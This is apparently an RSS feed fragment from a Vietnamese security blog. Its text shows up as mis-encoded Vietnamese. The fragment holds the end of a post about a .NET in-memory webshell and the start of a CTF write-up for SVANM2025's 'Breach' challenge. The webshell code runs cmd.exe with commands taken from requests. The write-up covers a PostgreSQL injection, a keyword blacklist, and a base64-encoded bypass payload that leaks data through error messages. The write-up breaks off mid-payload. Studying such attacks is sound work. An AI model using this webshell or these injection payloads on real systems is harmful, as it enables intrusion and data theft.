&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FileName&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Arguments&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;/c&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UseShellExecute&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RedirectStandardOutput&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RedirectStandardError&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UTF8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StandardOutput&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadToEnd&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StandardError&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadToEnd&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Default&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;&amp;lt;%&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ModuleMemShell&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;%&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Cuá»‘i cÃ¹ng lÃ  exec command táº¡i Ä‘Æ°á»ng dáº«n báº¥t ká»³:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HJBS9psS-g.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ³ má»™t lÆ°u Ã½ nhÆ° sau: Khi load memshell nÃ y báº±ng file ashx hoáº·c deser, code inject thÃ¬ cáº§n sá»­a Ä‘á»•i handler_name cho phÃ¹ há»£p Ä‘á»ƒ code mÃ¬nh cÃ³ thá»ƒ xÃ³a Ä‘Æ°á»£c Ä‘Ãºng event, táº¡i Ä‘Ã¢y mÃ¬nh Ä‘ang vÃ­ dá»¥ load memshell code báº±ng file aspx.&lt;/p&gt;</description></item><item><title>SVANM2025: The End Of Beginning</title><link>https://kev1n1203.github.io/p/svanm-2025/</link><pubDate>Sun, 16 Nov 2025 17:28:53 +0000</pubDate><guid>https://kev1n1203.github.io/p/svanm-2025/</guid><description>&lt;p&gt;MÃ¬nh nghÄ© cÅ©ng pháº£i 8 thÃ¡ng sau bÃ i wu gáº§n nháº¥t, khÃ´ng pháº£i lÃ  do mÃ¬nh khÃ´ng chÆ¡i ná»¯a, mÃ  lÃ  do mÃ¬nh lÆ°á»i. MÃ£i sau khi thi xong SVANM, mÃ¬nh má»›i tháº¥y lÃ  mÃ¬nh nÃªn táº­p tÃ nh viáº¿t trá»Ÿ láº¡i, nÃªn Ä‘Ã¢y sáº½ lÃ  hÃ nh trÃ¬nh thi trong 8 tiáº¿ng cá»§a mÃ¬nh hÆ¡n lÃ  má»™t writeup thuáº§n tÃºy.&lt;/p&gt;
&lt;p&gt;LÃ  má»™t sinh viÃªn nÄƒm 4(.5) chuáº©n bá»‹ ra trÆ°á»ng may máº¯n Ä‘Æ°á»£c lá»±a chá»n Ä‘á»ƒ Ä‘i thi Sinh ViÃªn An Ninh Máº¡ng, tiá»n thÃ¢n lÃ  Sinh ViÃªn vá»›i An ToÃ n ThÃ´ng tin. Cho nÃªn Ä‘Ã¢y lÃ  láº§n Ä‘áº§u cÅ©ng lÃ  láº§n cuá»‘i mÃ¬nh cÃ³ thá»ƒ tham gia cuá»™c thi nÃ y.&lt;/p&gt;
&lt;p&gt;Äiá»u Ä‘áº·c biá»‡t lÃ  chung kháº£o nÄƒm nay lÃ  khÃ´ng thi theo kiá»ƒu Attack-Defend truyá»n thá»‘ng mÃ  sá»­ dá»¥ng format nÄƒm 2020-2021: King Of The Hill. NÃ³i nÃ´m na thÃ¬ nÃ³ lÃ  jeo, ai solve nhanh nháº¥t sáº½ Ä‘Æ°á»£c Ä‘iá»ƒm cá»§a 1 round - 100 Ä‘iá»ƒm. CÃ¡c challenge cÃ³ cÃ¡c cÃ¡ch patch khÃ¡c nhau, cÃ¡c Ä‘á»™i cÃ²n láº¡i náº¿u muá»‘n khai thÃ¡c thÃ¬ sáº½ pháº£i Ä‘á»£i round sau hoáº·c unpatch Ä‘á»ƒ attack.&lt;/p&gt;
&lt;p&gt;Pháº§n King of the Hill cÃ³ 2 challenge web, mÃ¬nh nhÃ¬n tháº¥y challenge 1 cáº§n tÃ i khoáº£n Azure vÃ  review source code 1 há»“i tháº¥y khoai lang vÃ£o nÃªn bá» luÃ´n ğŸ—¿. Do Ä‘Ã³ mÃ¬nh chá»‰ cÃ²n 1 chall web Ä‘á»ƒ giÃ nh giáº­t Ä‘iá»ƒm lÃ  challenge thá»© 2: Breach&lt;/p&gt;
&lt;h2 id="breach"&gt;Breach
&lt;/h2&gt;&lt;p&gt;Má»™t challenge Java khÃ´ng outbound vá»›i docker cho flag vÃ o cáº£ 2 service web lÃ  db, kháº£ nÄƒng sáº½ cÃ³ 2 cÃ¡ch Ä‘á»ƒ láº¥y flag:
&lt;img src="https://hackmd.io/_uploads/S1cWtxdlZl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;Author cÅ©ng cung cáº¥p cÃ¡ch Ä‘á»ƒ patch challenge lÃ  sáº½ patch táº¡i 2 file: patchme.groovy vÃ  patchme.jsp. CÃ¡c file jsp sáº½ inlcude file patchme.jsp, tÆ°Æ¡ng tá»± vá»›i groovy:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rkpdheOg-g.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/Skoh2x_lZl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id="sql-injection-in-function"&gt;SQL Injection In Function
&lt;/h3&gt;&lt;p&gt;Ngay sau khi báº¯t Ä‘áº§u cuá»™c thi, mÃ¬nh vÃ  teammate Ä‘Ã£ ngá»“i vÃ o lÃ m luÃ´n challenge 2 vÃ  spot tháº¥y sql injection táº¡i detail_services.jsp:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;%
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; String service_name = request.getParameter(&amp;#34;service_name&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if(service_name == null) service_name = &amp;#34;&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (!isSafeArgument(service_name)) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; PreparedStatement ps = null;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ResultSet rs = null;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; try {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; String sql = &amp;#34;SELECT * FROM get_service_details_dynamic(?)&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ps = conn.prepareStatement(sql);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ps.setString(1, service_name);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; rs = ps.executeQuery();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;%&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Function get_service_details_dynamic Ä‘Æ°á»£c ná»‘i chuá»—i vÃ o cÃ¢u lá»‡nh SELECT, ngon á»“i:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;CREATE OR REPLACE FUNCTION get_service_details_dynamic(p_service_name VARCHAR)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RETURNS TABLE(
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; service_name VARCHAR,
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; feature VARCHAR,
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; description TEXT
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;) AS $$
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;DECLARE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sql_query TEXT;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;BEGIN
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -- Build the SQL string
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sql_query := &amp;#39;SELECT s.name AS service_name, d.feature, d.description &amp;#39; ||
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;#39;FROM public.detail_services d &amp;#39; ||
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;#39;JOIN public.services s ON d.service_id = s.id &amp;#39; ||
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;#39;WHERE s.name ILIKE &amp;#39;&amp;#39;%&amp;#39;||p_service_name||&amp;#39;%&amp;#39;&amp;#39;&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -- Execute the dynamic SQL and return results
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RETURN QUERY EXECUTE sql_query;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;END;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$$ LANGUAGE plpgsql;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tháº­t ra cÃ²n 2 function ná»‘i chuá»—i ná»¯a trong source code, nhÆ°ng cÃ³ 1 function khÃ´ng gá»i Ä‘áº¿n, cÃ²n 1 function nháº­n Ä‘áº§u vÃ o lÃ  int nÃªn mÃ¬nh cÅ©ng khÃ´ng Ä‘á»ƒ Ã½ láº¯m mÃ  xem param nÃ y bá»‹ filter cÃ¡i gÃ¬ táº¡i &lt;code&gt;isSafeArgument(service_name)&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;span class="lnt"&gt;8
&lt;/span&gt;&lt;span class="lnt"&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;private String[] blackLists = {&amp;#34;pg_&amp;#34;, &amp;#34;chr&amp;#34;, &amp;#34;select&amp;#34;, &amp;#34;insert&amp;#34;, &amp;#34;update&amp;#34;, &amp;#34;copy&amp;#34;, &amp;#34;lo_&amp;#34;, &amp;#34;program&amp;#34;, &amp;#34;xml&amp;#34;, &amp;#34;;&amp;#34;};
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public boolean isSafeArgument(String input) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; for (String keyword: blackLists) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (input.toLowerCase().contains(keyword.toLowerCase())) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return false;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return true;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vá»›i kiá»ƒu filter nÃ y lowercase rá»“i contains thÃ¬ khÃ³ á»“i =)), mÃ¬nh ngá»“i loay hoay tÃ¬m trick 1 lÃºc khÃ´ng ra gÃ¬ thÃ¬ nhá»› láº¡i trong Ä‘á»‘ng function Ä‘Æ°á»£c khai bÃ¡o cÃ³ 1 function khÃ´ng sá»­ dá»¥ng trong code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;CREATE OR REPLACE FUNCTION sdecode(encoded TEXT)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RETURNS TEXT AS $$
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;DECLARE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sql_query TEXT;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; result TEXT;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;BEGIN
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sql_query := &amp;#39;SELECT convert_from(decode(&amp;#39;&amp;#39;&amp;#39;||encoded||&amp;#39;&amp;#39;&amp;#39;, &amp;#39;&amp;#39;base64&amp;#39;&amp;#39;), &amp;#39;&amp;#39;UTF8&amp;#39;&amp;#39;)&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;EXECUTE sql_query INTO result;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RETURN result;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;END;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$$ LANGUAGE plpgsql;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Thay vÃ¬ lá» má» Ä‘i kiáº¿m trick bypass, mÃ¬nh sáº½ gá»i Ä‘áº¿n sdecode Ä‘á»ƒ sqli vÃ o trong hÃ m nÃ y, vá»›i Ã½ tÆ°á»Ÿng lÃ  payload truyá»n vÃ o sáº½ Ä‘Æ°á»£c base64 xong rá»“i má»›i Ä‘Æ°a vÃ o sdecode:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;it_db=# select convert_from(decode(&amp;#39;UVE9PScsICdiYXNlNjQnKSwgJ1VURjgnKXx8Y2FzdCh2ZXJzaW9uKCkgYXMgbnVtZXJpYyktLQ==&amp;#39;, &amp;#39;base64&amp;#39;), &amp;#39;UTF8&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; convert_from
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;---------------------------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; QQ==&amp;#39;, &amp;#39;base64&amp;#39;), &amp;#39;UTF8&amp;#39;)||cast(version() as numeric)--
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;(1 row)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;it_db=# select sdecode(convert_from(decode(&amp;#39;UVE9PScsICdiYXNlNjQnKSwgJ1VURjgnKXx8Y2FzdCh2ZXJzaW9uKCkgYXMgbnVtZXJpYyktLQ==&amp;#39;, &amp;#39;base64&amp;#39;), &amp;#39;UTF8&amp;#39;));
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ERROR: invalid input syntax for type numeric: &amp;#34;PostgreSQL 13.23 (Debian 13.23-1.pgdg13+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;CONTEXT: SQL statement &amp;#34;SELECT convert_from(decode(&amp;#39;QQ==&amp;#39;, &amp;#39;base64&amp;#39;), &amp;#39;UTF8&amp;#39;)||cast(version() as numeric)--&amp;#39;, &amp;#39;base64&amp;#39;), &amp;#39;UTF8&amp;#39;)&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;PL/pgSQL function sdecode(text) line 7 at EXECUTE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vá»›i viá»‡c flag náº±m á»Ÿ /flag.txt, mÃ¬nh chá»‰ cáº§n thay version() thÃ nh pg_read_file() lÃ  cÃ³ thá»ƒ leak flag qua error based rá»“i:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
